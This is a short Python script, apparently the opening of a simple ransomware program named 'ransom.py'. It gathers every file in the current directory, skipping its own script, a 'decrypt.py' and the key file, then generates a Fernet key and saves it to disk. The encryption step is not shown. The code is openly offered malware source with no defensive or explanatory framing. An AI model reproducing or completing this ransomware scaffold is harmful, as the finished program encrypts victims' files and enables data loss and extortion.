import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == 'ransom.py' or file == 'decrypt.py' or file == 'thekey.key':
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open('thekey.key', 'wb') as thekey:
    thekey.write(key)
